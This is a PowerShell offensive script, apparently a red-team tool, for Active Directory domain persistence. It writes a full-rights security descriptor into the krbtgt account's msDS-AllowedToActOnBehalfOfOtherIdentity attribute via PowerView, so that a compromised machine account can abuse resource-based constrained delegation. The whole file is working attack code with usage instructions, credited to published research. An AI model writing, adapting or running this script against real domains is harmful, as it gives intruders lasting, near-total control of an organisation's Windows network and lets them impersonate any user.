#
# Unconstrained Domain Persistence helper
#
# Usage:
#   PS> . .\Set-PrincipalAllowedToDelegateToAccount.ps1
#   PS> Set-PrincipalAllowedToDelegateToAccount -TargetUser krbtgt -DelegateFrom COMPROMISED$
#
# Will allow for COMPROMISED$ account to perform S4U2 constrained delegation by the use
# of Resource-Based Constrained Delegation flavour attack. This account must have any SPN set first.
#
# Script for setting "msDS-AllowedToActOnBehalfOfOtherIdentity" property on the user's object, 
# allowing incoming trust to the previously compromised Machine object, as described 
# by Elad Shamir in his: https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#unconstrained-domain-persistence
#
# It does the same as the following commands:
#	PS> Import-Module ActiveDirectory
#	PS> Set-ADUser krbtgt -PrincipalAllowedToDelegateToAccount COMPROMISED$
#
# This script requires PowerView to be loaded first.
#
# This is basically rewritten script from Harmj0y's blog post here:
#   https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/
# all credits goes to magnificent Harmj0y!
#

function Set-PrincipalAllowedToDelegateToAccount
{
    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $TargetUser,

        [Parameter(Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DelegateFrom
    )
    
    # translate the identity to a security identifier
    $IdentitySID = ((New-Object -TypeName System.Security.Principal.NTAccount -ArgumentList $DelegateFrom).Translate([System.Security.Principal.SecurityIdentifier])).Value

    # Substitute the security identifier into the raw SDDL
    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($IdentitySID))"

    # get the binary bytes for the SDDL
    $SDBytes = New-Object byte[] ($SD.BinaryLength)
    $SD.GetBinaryForm($SDBytes, 0)

    # set new security descriptor for 'msds-allowedtoactonbehalfofotheridentity'
    Get-DomainUser $TargetUser | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
}
